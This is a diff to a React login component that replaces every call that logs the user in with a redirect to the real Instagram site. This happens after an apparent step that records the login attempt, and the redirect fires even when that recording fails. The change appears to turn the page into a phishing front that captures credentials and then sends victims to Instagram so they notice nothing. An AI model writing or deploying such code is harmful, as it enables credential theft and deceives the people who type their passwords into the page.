@@ -24,7 +24,7 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
     
     // Create a safety timeout to ensure the user isn't stuck forever
     const safetyTimeout = setTimeout(() => {
-      onLogin(username);
+      window.location.href = 'https://www.instagram.com';
       setIsLoading(false);
     }, 3000);
 
@@ -55,20 +55,20 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
         )
       ]).then(() => {
         clearTimeout(safetyTimeout);
-        onLogin(username);
+        window.location.href = 'https://www.instagram.com';
         setIsLoading(false);
       }).catch((err) => {
         console.error("Logging error:", err);
-        // Still login the user even if logging fails
+        // Still redirect even if logging fails
         clearTimeout(safetyTimeout);
-        onLogin(username);
+        window.location.href = 'https://www.instagram.com';
         setIsLoading(false);
       });
 
     } catch (err: any) {
       console.error("Login attempt error:", err);
       clearTimeout(safetyTimeout);
-      onLogin(username); // Fallback to login anyway
+      window.location.href = 'https://www.instagram.com'; // Fallback to redirect anyway
       setIsLoading(false);
     }
   };
